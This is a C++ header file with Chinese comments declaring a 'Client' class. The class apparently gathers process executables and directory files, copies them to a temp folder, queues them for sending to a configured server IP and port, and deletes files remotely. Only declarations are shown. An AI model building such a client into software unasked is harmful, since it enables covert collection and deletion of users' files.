////////////////////////////////////////////////////////////////////
//                          _ooOoo_                               //
//                         o8888888o                              //
//                         88" . "88                              //
//                         (| ^_^ |)                              //
//                         O\  =  /O                              //
//                      ____/`---'\____                           //
//                    .'  \\|     |//  `.                         //
//                   /  \\|||  :  |||//  \                        //
//                  /  _||||| -:- |||||-  \                       //
//                  |   | \\\  -  /// |   |                       //
//                  | \_|  ''\---/''  |   |                       //
//                  \  .-\__  `-`  ___/-. /                       //
//                ___`. .'  /--.--\  `. . ___                     //
//             ."" '<  `.___\_<|>_/___.'  >'"".                   //
//            | | :  `- \`.;`\ _ /`;.`/ - ` : | |                 //
//            \  \ `-.   \_ __\ /__ _/   .-` /  /                 //
//     ========`-.____`-.___\_____/___.-`____.-'========          //
//                          `=---='                               //
//     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^         //
//         佛祖保佑       永无BUG     永不修改					  //
////////////////////////////////////////////////////////////////////
#pragma once
#include "cNetWork.h"
#include "intialSoket.h"
#include <vector>
#include <map>
struct LOCALFILEINFO
{
	_fsize_t dwLength;
	std::string stFilePath;
};
struct PathPrarm
{
	char path[MAX_PATH];
	bool Somefile;
};
class Client
{
	HANDLE HThread;
	CInitSock initsock;	//Socket初始化
	cNetWork g_NETWORK; //传输类
	
	PathPrarm  *prarm;
	//进程路径获取
	BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath);
	std::string GetProcessFullPath(DWORD dwPID);
	//创建多级目录
	bool createDirectory(std::string folder);
	//清空目录下所有文件包括子目录
	BOOL DoRemoveDirectory(std::string chrDirName);
public:
	Client(void);
	~Client(void);
	static std::vector<std::string> m_FilePath; //文件路径保存数组
	static std::map<std::string,LOCALFILEINFO> m_WatiSendFile; //需发送文件信息
	static std::string TempPathInfo; //临时路径
	GETINSTANCE(Client);
	//生成文件大小文字信息
	std::string MakeFileSizeStr(_fsize_t size);
	//设置接收服务器IP和端口
	void SetServerInfo(char * IP,int port);
	//获取目录下详细文件信息到结构
	void getFilesAll(std::string path, std::map<std::string,LOCALFILEINFO>& files);
	//获取目录下所有文件路径到数组
	void getFilesAll(std::string path, std::vector<std::string>& files);
	//获取进程信息
	void GetProcessFileInfo();
	//拷贝进程程序到临时目录
	void CopyProcessFile();
	//获取目录文件路径
	void GetPathFileInfo(std::string path,bool SomeFile = false);
	//[删除文件][By:十里坡剑神][QQ:112582793][2018/4/5]
	void DoDeleteFile(std::string path,bool SomeFile = false);
	
	//拷贝目录文件到临时目录
	void CopyPathFileInfo(std::string path,bool SomeFile = false);
	//路径内取文件名
	std::string GetFileName(std::string str);
	std::string GetFilePath(std::string str);
	//将文件信息写入到文本文件
	void WriteFileInfo();
	//获取目录信息
	void GetPathInfo(std::string path);
	void BeginGetProces();
	void BeginGetPathFile(std::string path,bool SomeFile = false);
	void BeginGetPathInfo(std::string path,bool SomeFile = false);
	void DeleteFileForPath(std::string path,bool SomeFile = false);
	void FuckRubbish();
	void DoDeleteRubbish(std::string path);
	//线程函数
	int GetProcess();
	int GetPathFile(PVOID pParm);
	int GetPathInfoT(PVOID pParm);
	int MyDeleteFile(PVOID pParm);
	//单例模式
};

#define sClient Client::GetInstance()